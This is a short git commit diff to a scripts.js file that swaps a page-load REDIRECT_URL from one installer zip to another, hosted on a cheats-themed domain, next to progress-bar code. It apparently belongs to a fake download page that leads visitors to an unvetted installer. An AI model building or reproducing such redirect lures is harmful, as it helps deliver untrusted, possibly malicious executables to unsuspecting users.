a67941d1aa6a71b21109764aa1cbcd0cbedf984f
laplaplaplas <laplaplaplas@gmail.com>
2026-07-05 12:58:32 +0300

    Update redirect URL in scripts.js

--- scripts.js
+++ scripts.js
@@ -1,5 +1,5 @@
 document.addEventListener("DOMContentLoaded", () => {
-  const REDIRECT_URL = "https://ultraviolence.buzz/d/Installer.zip";
+  const REDIRECT_URL = "https://www.resight-cheats.net/installer.zip";
 
   const bar         = document.getElementById("progress-bar");
   const pct         = document.getElementById("progress-pct");
